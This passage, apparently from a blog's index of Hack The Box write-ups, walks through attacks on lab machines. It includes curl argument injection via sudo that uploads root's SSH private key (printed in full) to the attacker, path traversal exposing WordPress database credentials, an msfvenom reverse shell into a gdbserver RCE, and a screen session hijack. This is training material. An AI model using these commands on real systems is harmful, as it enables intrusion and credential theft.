\"'\", '@', '#', '$', '%', '^', '(', ')']  Actually, it might be easier to show the non-bad characters (skipping ASCII letters and numbers):\n['{', '}', ',', '.', '[', ']', '-', '+', ':', '\"', '/', '*']  Notice that we cannot use spaces because there is a regular expression that matches any white space:\nres = bool(re.search('\\\\s', ip))  Let\u0026rsquo;s see what we can do with these non-bad characters.\nPrivilege escalation with sudo As shown previously, the user code is able to run /usr/bin/treport as root using sudo. So, every action in this context will be done as root.\nThe program treport is using curl to handle the threat report download. It can be seen in the source code or entering 127.0.0.1:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:127.0.0.1 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2078 100 2078 0 0 405k 0 --:--:-- --:--:-- --:--:-- 405k  The output of curl is shown. Actually, we can pass nothing and see a curl error:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name: curl: no URL specified! curl: try 'curl --help' or 'curl --manual' for more information  And even show the help panel of curl:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:--help Usage: curl [options...] \u0026lt;url\u0026gt; --abstract-unix-socket \u0026lt;path\u0026gt; Connect via abstract Unix domain socket --alt-svc \u0026lt;file name\u0026gt; Enable alt-svc with this cache file --anyauth Pick any authentication method -a, --append Append to target file when uploading --basic Use HTTP Basic Authentication --cacert \u0026lt;file\u0026gt; CA certificate to verify peer against --capath \u0026lt;dir\u0026gt; CA directory to verify peer against ...  Taking into account that we can use {, } and ,, we can use them as \u0026ldquo;spaces\u0026rdquo; because it works in Bash.\nFor example, this command:\n$ curl {10.10.17.44,-T,/root/.ssh/id_rsa} -o /root/reports/threat_report_HH_MM_SS  Is equivalent to:\n$ curl 10.10.17.44 -T /root/.ssh/id_rsa -o /root/reports/threat_report_HH_MM_SS  Using this payload, we can transfer the SSH private key of root to our machine (-T is used in curl to upload the contents of a file with a PUT request). For that, let\u0026rsquo;s use nc to listen on port 80 (HTTP), and put the payload in treport:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{10.10.17.44,-T,/root/.ssh/id_rsa} % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2590 0 0 100 2590 0 1257 0:00:02 0:00:02 --:--:-- 1257  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.126. Ncat: Connection from 10.10.11.126:33912. PUT /id_rsa HTTP/1.1 Host: 10.10.17.44 User-Agent: curl/7.68.0 Accept: */* Content-Length: 2590 Expect: 100-continue -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAxo4GzoC3j6jxx+7LbM8ik5O1GMOesA2aqI4rlfPTAsqm9+WgEOKo +sZ1zqhtVlZuuIOmFDie+0EL5GtsIgOaFEtQZ1m3TxOK5zDrSaFO06SLIIu6qXH8fRuhp3 Y3h5e08o3/Kp5uSGhN+mBLMPB0qYXVP7twHbc2HYHaFBgPgreLf6W4uPmD/Zq6vaC/Q+5r B6qvowOPysPNCUgZ7HQcDYXJt876aCyVlKdu0A0Amm80txSvthx+LNuMg3NeLFEYN9exYD CcykRq1dch/tFJ/ej8sQ5y8c6AbUQAcckmDzGhBrlaPEDJ6H3NSEJrqeZmbvJ75P9bNoyQ yUR7ukamgiSZNhHWugCApb96ZdxNia9q4YhrJMN1vz7aKSH0lvbin97o6sZgn3xh2Zcm+U uskfHoguvNwYgyCxnIpAsZDRjhNG1R/1hrxJOmt80eheIPM6b417z5db+cBfxJPsAod+jh qpP4QirNQN67+TFeRpGnZ5B8MBtGIgUL+rNUFTEHAAAFgHSyAcl0sgHJAAAAB3NzaC1yc2 EAAAGBAMaOBs6At4+o8cfuy2zPIpOTtRjDnrANmqiOK5Xz0wLKpvfloBDiqPrGdc6obVZW briDphQ4nvtBC+RrbCIDmhRLUGdZt08Tiucw60mhTtOkiyCLuqlx/H0boad2N4eXtPKN/y qebkhoTfpgSzDwdKmF1T+7cB23Nh2B2hQYD4K3i3+luLj5g/2aur2gv0Puaweqr6MDj8rD zQlIGex0HA2FybfO+mgslZSnbtANAJpvNLcUr7YcfizbjINzXixRGDfXsWAwnMpEatXXIf 7RSf3o/LEOcvHOgG1EAHHJJg8xoQa5WjxAyeh9zUhCa6nmZm7ye+T/WzaMkMlEe7pGpoIk mTYR1roAgKW/emXcTYmvauGIayTDdb8+2ikh9Jb24p/e6OrGYJ98YdmXJvlLrJHx6ILrzc GIMgsZyKQLGQ0Y4TRtUf9Ya8STprfNHoXiDzOm+Ne8+XW/nAX8ST7AKHfo4aqT+EIqzUDe u/kxXkaRp2eQfDAbRiIFC/qzVBUxBwAAAAMBAAEAAAGAUPVkLRsqvXbjbuQdKfajYI0fkE NjFuHVJ9kgSHoslbzPq9CDHZ9tyyLUsjjWrBd9+dokA6a6nDP/h1mNs6jIUHINDLb2GVYc kvvNVC5jl8RFvjV7HNAPZWu41DFNnwnqi+P+IQCMcxWkhexxfDjvOJgLRXtF0bf8Zrellf /hgykXxipqUXHbsbI/ZkZ+9lHmbi/YgZ1YKhMALUKq31DQh2r/vuS0EXnsW7qRYl+K2W1y jxvuMVEY2W2Ds618vpEpmO/KnN2QbQD67tGqKX4DuHiIoguHeYU6i5ypQJnS6vJ7AjjNwc a7nHfsJhasYOfnRhm+6XW5uArX2swBAxoRc9aMmay688qP/Ga+UpOaLVX1pfuESjPjlbdY TvxZqk0HQNowBmYx4LW71Ot7q8VQ7FdQVMsVTf491aiBWxLtJcAu59nKwjxjNLmPVr/G7t 3tlUbnZGjDWX3339X7fQS7J+TZzegknJjm14t/cphhJGESS/CcfZAroOIVLXDcwTURAAAA wDG2cThFZxyeqzm5XslU6WMLytamPnD8I2FSTbVG7Y1FmVU87anYNScnQ8cdy/dgNPoD/E jSsWmO7EDD3sQW1rk7YadmN58TFyXHw33tqRJkmgOfHT50a7txg2IrhJ7RxDSlLfNa8crX QGTEPk9gTngbqMuB5cQjLJQzD3o0G+sfp4K8nlL3ME6Fi1ghq4m4YwqjnKkVVR7+G11eLc JfBAZfM/gWkihEror0/nEgKmciHs23bSJGo+BwXKadXbWscQAAAMEA4kwybL8ps/SLm8S5 N+UxoqSDFp0ycQcS0fAvHwMRDSUahP/d2sfwKCY2EszHLRjF+BYLrGEvJB5GHH1hl+MX1E d3Ufqd2279j9fJsJre4xpIGp7A6dfZk9ds70VfwkTHy0AnincGOVW7nw5mT4ZhukYcrWNs lmHZG368yJgbIJa2YQy3yICqWIE65y+4B+nBr0IgBCk7m27aRKG6w6HVcaIPzEZYxqy3sz b5T0bbfIuZowodtsQtpoc5W0xavZnLAAAAwQDgnaUcotAphCkv8xeQmeyluMRhUvu+/E9O bQFOwkr+gpJ0vFdH7UFDOvCv4reh88XsK2NVfHom9xjI+6QsXGymxkUf4IhmCTVODoVpks eGrfBd8Ri19zkiUCp39CRpVZCqzHabeYWsYIIRJ5XY4FIga5V00UOh3vomtQ5j8a1jCkZ+ JVpkJVJSBp4qQUMFMdYx3bj4NcNPnvmb+TW4mgCDt/urNA7pSQ3T1gXbmag9ezFqSmSzC2 a5BI6W1lTZzjUAAAAJcm9vdEBjb2RlAQI= -----END OPENSSH PRIVATE KEY-----  Unexpectedly, this SSH private key does not work. One could transfer the root.txt flag in a similar way.\nHowever, if we want to get a shell as root, we have two options since we can output files using curl (write permissions as root):\n Modify /etc/passwd in order to change the password for the root user Upload an SSH public key into /root/.ssh/authorized_keys  This time, I decided to use the second option. For that, we must generate SSH keys and expose the public one with a Python web server:\n$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:i1sUXxdZ0+4pw/Y7Tv0KW/DwqgFdCCZhJTmpJ32a6Pk The key's randomart image is: +---[RSA 3072]----+ | ==+ .+o| | .++ . . ..o| | o .. . o .. | | o o .+ o . .| | + +S o + ..| | . oo o X .o| | . .. o . o B..| | o o . =.o.| | .E ..o o++| +----[SHA256]-----+ $ python -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  Then, using treport we can request the public key (id_rsa.pub) and save it to /root/.ssh/authorized_keys:\ncode@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{10.10.17.44/id_rsa.pub,-o,/root/.ssh/authorized_keys} % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 553 100 553 0 0 2323 0 --:--:-- --:--:-- --:--:-- 2323  Finally, we can access as root especifying our private key (id_rsa) without password:\n$ ssh -i id_rsa root@10.10.11.126 root@code:~# cat root.txt 3eb081061035fcd241f3e389d991f146  ","image":"/images/HTB/Unicode/Unicode.png","permalink":"https://7rocky.github.io/en/htb/unicode/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine uses JWT tokens with JWKS and JKU that can be forged to arrive to a directory path traversal vulnerability that can be exploited using some Unicode bypassing. After that, there is a Python compiled binary that can be run with sudo and uses curl behind the hoods. Some JWT knowledge, path traversal and command injection bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit a directory path traversal using JWT with JWKS","time":14,"title":"Unicode"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.125   Release: 20 / 11 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.125 -p 22,80,1337 Nmap scan report for 10.10.11.125 Host is up (0.33s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-title: Backdoor \u0026#8211; Real-Life |_http-server-header: Apache/2.4.41 (Ubuntu) 1337/tcp open waste? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 44.66 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 1337 open.\nEnumeration If we go to http://10.10.11.125, we will see a Wordpress site like the following. If we try to navigate, we will be redirected to http://backdoor.htb, so we need to enter backdoor.htb into /etc/hosts.\nWe can see that there is a default post for the admin user:\nMoreover, we can enumerate the used plugins going to /wp-content/plugins (since there is a directory listing vulnerability):\nWordpress enumeration The plugin called eBook Download is vulnerable to Directory Path Traversal, as shown in the output of searchsploit:\n$ searchsploit wordpress ebook download ----------------------------------------------------------- ----------------------- Exploit Title | Path ----------------------------------------------------------- ----------------------- WordPress Plugin eBook Download 1.1 - Directory Traversal | php/webapps/39575.txt ----------------------------------------------------------- ----------------------- Shellcodes: No Results $ cat 39575.txt # Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal # Exploit Author: Wadeek # Website Author: https://github.com/Wad-Deek # Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip # Version: 1.1 # Tested on: Xampp on Windows7 [Version Disclosure] ====================================== http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt ====================================== [PoC] ====================================== /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php ======================================  Foothold With this plugin, we are able to read files from the server if the system user (usually www-data) has enough permissions.\nDirectory Path Traversal exploitation We can check with curl that the exploit works:\n$ curl 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/hosts' /etc/hosts/etc/hosts/etc/hosts127.0.0.1 localhost 127.0.1.1 backdoor # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters \u0026lt;script\u0026gt;window.close()\u0026lt;/script\u0026gt;  However, we observe that the first and the last line contain some data that can be a little annoying. To avoid this, we can encapsulate the GET request in a simple Python script called dpt.py to filter the unwanted data (detailed explanation here). Now we can read only the desired file, for example, /etc/passwd:\n$ python3 dpt.py /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin user:x:1000:1000:user:/home/user:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false  We can check the Wordpress configuration in the file wp-config.php:\n$ python3 dpt.py /var/www/html/wp-config.php  \u0026lt;?php // ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'wordpressuser' ); /** MySQL database password */ define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' ); /** The database collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' ); // ... require_once ABSPATH . 'wp-settings.php';  Here we find the credentials to access MySQL. However, MySQL is not exposed and we have not got any type of access to the machine. We cannot access the Wordpress administrator panel (/wp-admin) using this password and neither login using SSH into the machine.\nProcess enumeration At this point, we can recall that the machine has another port open. In fact, port 1337.\nUsing the Wordpress plugin, we can read all the running processes from the file /proc/sched_debug. Since there are a lot of processes, we can filter by those that contain sh, to list only the ones that are executed within a shell session:\n$ python3 dpt.py /proc/sched_debug | grep sh I kdmflush 342 1982.495633 2 100 0.000000 0.017011 0.000000 0 0 / S sh 958 1022.736050 390 120 0.000000 82.017080 0.000000 0 0 /autogroup-67 S sshd 968 10.389860 10 120 0.000000 12.014977 0.000000 0 0 /autogroup-72 S ib_pg_flush_co 1013 1111.061054 220 120 0.000000 18.966596 0.000000 0 0 /autogroup-79 S bash 995 0.499467 2 120 0.000000 2.034465 0.000000 0 0 /autogroup-81 I kdmflush 340 1996.290992 2 100 0.000000 0.011462 0.000000 0 0 / S sh 959 0.004608 2 120 0.000000 1.493881 0.000000 0 0 /autogroup-68 S ib_log_flush 1029 295.362337 2107 120 0.000000 46.223983 0.000000 0 0 /autogroup-79 S bash 1018 40.675562 46 120 0.000000 27.889225 0.000000 0 0 /autogroup-83  The good thing about /proc/sched_debug is that we have the PID (process identifier) in the third column starting from the left. Now, we can obtain more detailed information about a specific process. Namely, /proc/\u0026lt;PID\u0026gt;/cmdline will tell us how the process has been started; /proc/\u0026lt;PID\u0026gt;/environ will show any environment variables set to run the process; and /proc/\u0026lt;PID\u0026gt;/fd/\u0026lt;FD\u0026gt; will print a file descriptor for the process (0 for stdin, 1 for stdout, 2 for stderr, etc.).\nThis time, showing the commands is more interesting. Using some of the above process identifiers, we see two curious commands:\n$ python3 dpt.py /proc/958/cmdline /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done $ python3 dpt.py /proc/959/cmdline /bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done  For the moment, we will focus on the second one. It is running gdbserver on port 1337 to debug some binary file (/bin/true).\nWe can verify that the process is running filtering for gdbserver in the file /proc/sched_debug:\n$ python3 dpt.py /proc/sched_debug | grep gdbserver S gdbserver 996 3.421556 16 120 0.000000 2.985488 0.000000 0 0 /autogroup-81 $ python3 dpt.py /proc/996/cmdline gdbserver--once0.0.0.0:1337/bin/true  So it seems that the entry vector is gdbserver. This is the command:\ngdbserver --once 0.0.0.0:1337 /bin/true  Obtaining RCE from gdbserver We can actually connect to the gdbserver instance from a local gdb session (using target remote 10.10.11.125:1337). However, it is not easy to interact with the server this way.\nLooking for exploits, we can find a Metasploit module (multi/gdb/gdb_server_exec). This module works fine and will return a shell. However, I decided to understand the module and write an exploit in Python called pwn_gdbserver.py to gain Remote Code Execution (detailed explanation here).\nThe exploit can also be found in ExploitDB and using searchsploit:\n$ searchsploit gdbserver ---------------------------------------------------- ----------------------- Exploit Title | Path ---------------------------------------------------- ----------------------- GNU gdbserver 9.2 - Remote Command Execution (RCE) | linux/remote/50539.py ---------------------------------------------------- ----------------------- Shellcodes: No Results  To use my exploit, an msfvenom payload is needed using the following command:\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 PrependFork=true -o rev.bin [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 106 bytes Saved as: rev.bin  After that, we can use the exploit as follows:\n$ python3 pwn-gdbserver.py 10.10.11.125:1337 rev.bin [+] Connected to target. Preparing exploit [+] Found x64 arch [+] Sending payload [*] Pwned!! Check your listener  And get a connection on our nc listener:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.125. Ncat: Connection from 10.10.11.125:39166. script /dev/null -c bash Script started, file is /dev/null user@Backdoor:/home/user$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm user@Backdoor:/home/user$ export TERM=xterm user@Backdoor:/home/user$ export SHELL=bash user@Backdoor:/home/user$ stty rows 50 columns 158  At this point, we can get the user.txt flag:\nuser@Backdoor:/home/user$ cat user.txt 424f67d5081afb1323b9772953cb0ac1  System enumeration Basic enumeration shows that /usr/bin/screen is a SUID binary:\nuser@Backdoor:/home/user$ find / -perm -4000 2/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/chfn /usr/bin/gpasswd /usr/bin/at /usr/bin/su /usr/bin/sudo /usr/bin/newgrp /usr/bin/fusermount /usr/bin/screen /usr/bin/umount /usr/bin/mount /usr/bin/chsh /usr/bin/pkexec  Let\u0026rsquo;s recall the weird process shown before with the vulnerable Wordpress plugin:\n$ python3 dpt.py /proc/958/cmdline /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done  Basically, the command is checking every second whether the directory /var/run/screen/S-root/ is empty. And if it is, then screen -dmS root will be executed.\nLooking at the help menu of screen we see that:\n-dmS name Start as daemon: Screen session in detached mode.  Privilege escalation So root has created a sessions called root and it is detached. Since screen is SUID, it will be run as the owner (root) when it is executed. As a result, as user we are able to enter the screen session of root as follows (notice that one root is for the username and the other one is for the session name):\nuser@Backdoor:/home/user$ screen -r root/root  root@Backdoor:~# cat root.txt 631c03c28fc182a3a4128ec8b39e2fb3  Clarification This is not a security issue of screen. The problem is that it has been explicitly configured as insecure:\nroot@Backdoor:~# ls -la total 48 drwx------ 7 root root 4096 Apr 23 05:53 . drwxr-xr-x 19 root root 4096 Nov 15 13:49 .. lrwxrwxrwx 1 root root 9 Jul 18 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 Nov 10 14:18 .cache drwx------ 3 root root 4096 Nov 10 14:18 .config drwxr-xr-x 3 root root 4096 Nov 10 14:18 .local lrwxrwxrwx 1 root root 9 Nov 6 21:40 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 161 Dec 5 2019 .profile drwxr-xr-x 2 root root 4096 Nov 10 14:18 .reset -rw-r--r-- 1 root root 33 Apr 23 00:31 root.txt -rw-r--r-- 1 root root 42 Apr 23 00:30 .screenrc -rw-r--r-- 1 root root 66 Apr 23 05:53 .selected_editor drwx------ 2 root root 4096 Nov 10 14:18 .ssh root@Backdoor:~# cat .screenrc multiuser on acladd user shell -/bin/bash  The .screenrc file indicates screen to be multi-user and allow the user called user to access root\u0026rsquo;s sessions. The default screen configuration will make each session private for the corresponding user, even if the binary was SUID.\nJust for testing purposes, let\u0026rsquo;s empty the .screenrc file and try to connect again to root\u0026rsquo;s session:\nroot@Backdoor:~# echo \u0026gt; .screenrc root@Backdoor:~# exit  [screen is terminating] user@Backdoor:/home/user$ screen -r root/root There is a screen on: 1741.root (01/02/22 12:34:56) (Private) There is no screen to be attached matching root.  It is not possible, screen makes private sessions by default.\nTo sum up, this privilege escalation was possible because screen was SUID and root configured its sessions as multi-user and allowed user explicitly to access its sessions (more information here).\n","image":"/images/HTB/Backdoor/Backdoor.png","permalink":"https://7rocky.github.io/en/htb/backdoor/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine contains a Wordpress website that has a plugin vulnerable to Directory Path Traversal, which can be used to enumerate running processes, and then a SUID binary. Wordpress enumeration and experience with file inclusion vulnerabilities is needed to compromise the machine. This write-up uses a custom Python script to read files from the server and a personal public exploit to gain access to the machine","time":9,"title":"Backdoor"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.161   Release: 12 / 04 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.161 -p 22,80 Nmap scan report for 10.10.11.161 Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http uvicorn |_http-server-header: uvicorn | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | content-type: text/plain; charset=utf-8 | Connection: close | Invalid HTTP request received. | FourOhFourRequest: | HTTP/1.1 404 Not Found | date: | server: uvicorn | content-length: 22 | content-type: application/json | Connection: close | {\"detail\":\"Not Found\"} | GetRequest: | HTTP/1.1 200 OK | date: | server: uvicorn | content-length: 29 | content-type: application/json | Connection: close | {\"msg\":\"UHC API Version 1.0\"} | HTTPOptions: | HTTP/1.1 405 Method Not Allowed | date: | server: uvicorn | content-length: 31 | content-type: application/json | Connection: close |_ {\"detail\":\"Method Not Allowed\"} |_http-title: Site doesn't have a title (application/json). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 80.81 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration The machine is hosting an API, we can interact with it directly from command line using curl:\n$ curl 10.10.11.161 {\"msg\":\"UHC API Version 1.0\"} $ curl -i 10.10.11.161 HTTP/1.1 200 OK date: server: uvicorn content-length: 29 content-type: application/json {\"msg\":\"UHC API Version 1.0\"}  It is using uvicorn. If we apply fuzzing, we see two endpoints:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.161/FUZZ docs [Status: 401, Size: 30, Words: 2, Lines: 1, Duration: 204ms] api [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 155ms] [Status: 200, Size: 29, Words: 4, Lines: 1, Duration: 198ms]  API enumeration We are not allowed to access /docs endpoint:\n$ curl -i 10.10.11.161/docs HTTP/1.1 401 Unauthorized date: server: uvicorn www-authenticate: Bearer content-length: 30 content-type: application/json {\"detail\":\"Not authenticated\"}  On the other hand, /api shows another endpoint:\n$ curl -i 10.10.11.161/api HTTP/1.1 200 OK date: server: uvicorn content-length: 20 content-type: application/json {\"endpoints\":[\"v1\"]}  And then another two are unveiled:\n$ curl -i 10.10.11.161/api/v1 HTTP/1.1 200 OK date: server: uvicorn content-length: 30 content-type: application/json {\"endpoints\":[\"user\",\"admin\"]}  But we can\u0026rsquo;t access them directly:\n$ curl -i 10.10.11.161/api/v1/user HTTP/1.1 404 Not Found date: server: uvicorn content-length: 22 content-type: application/json {\"detail\":\"Not Found\"} $ curl -i 10.10.11.161/api/v1/admin HTTP/1.1 307 Temporary Redirect date: server: uvicorn location: http://10.10.11.161/api/v1/admin/ Transfer-Encoding: chunked $ curl -i 10.10.11.161/api/v1/admin/ HTTP/1.1 401 Unauthorized date: server: uvicorn www-authenticate: Bearer content-length: 30 content-type: application/json {\"detail\":\"Not authenticated\"}  We can try to fuzz for more endpoints although we are not allowed:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/admin/FUZZ file [Status: 405, Size: 31, Words: 3, Lines: 1, Duration: 115ms]  $ curl -iX POST 10.10.11.161/api/v1/admin/file HTTP/1.1 401 Unauthorized date: server: uvicorn www-authenticate: Bearer content-length: 30 content-type: application/json {\"detail\":\"Not authenticated\"}  We see that it needs authentication, probably based in JSON Web Token (JWT) due to the response header www-authenticate: Bearer.\nSince we need to authenticate, we must find a way to create an account. We see that /api/v1/user/asdf responds with useful information (actually whatever word appended to /api/v1/user/):\n$ curl -i 10.10.11.161/api/v1/user/asdf HTTP/1.1 422 Unprocessable Entity date: server: uvicorn content-length: 104 content-type: application/json {\"detail\":[{\"loc\":[\"path\",\"user_id\"],\"msg\":\"value is not a valid integer\",\"type\":\"type_error.integer\"}]} $ curl -s 10.10.11.161/api/v1/user/asdf | jq { \"detail\": [ { \"loc\": [ \"path\", \"user_id\" ], \"msg\": \"value is not a valid integer\", \"type\": \"type_error.integer\" } ] }  This error tells us that the path is not a valid integer. Hence, let\u0026rsquo;s try an integer:\n$ curl -i 10.10.11.161/api/v1/user/1 HTTP/1.1 200 OK date: server: uvicorn content-length: 141 content-type: application/json {\"guid\":\"36c2e94a-4271-4259-93bf-c96ad5948284\",\"email\":\"admin@htb.local\",\"date\":null,\"time_created\":1649533388111,\"is_superuser\":true,\"id\":1} $ curl -s 10.10.11.161/api/v1/user/1 | jq { \"guid\": \"36c2e94a-4271-4259-93bf-c96ad5948284\", \"email\": \"admin@htb.local\", \"date\": null, \"time_created\": 1649533388111, \"is_superuser\": true, \"id\": 1 }  So there are users signed up on the API (user enumeration). Let\u0026rsquo;s try to sign up as well.\nRegistering a new account The common HTTP method used in an API for this purpose is POST:\n$ curl -iX POST 10.10.11.161/api/v1/user/signup HTTP/1.1 422 Unprocessable Entity date: server: uvicorn content-length: 81 content-type: application/json {\"detail\":[{\"loc\":[\"body\"],\"msg\":\"field required\",\"type\":\"value_error.missing\"}]} $ curl -sX POST 10.10.11.161/api/v1/user/signup | jq { \"detail\": [ { \"loc\": [ \"body\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" } ] }  This error is obvious because we have not inserted any request body. Let\u0026rsquo;s use an empty JSON document:\n$ curl 10.10.11.161/api/v1/user/signup -d '{}' -sH 'Content-Type: application/json' | jq { \"detail\": [ { \"loc\": [ \"body\", \"email\" ], \"msg\": \"field required\", \"type\": \"value_error.missing\" }, { 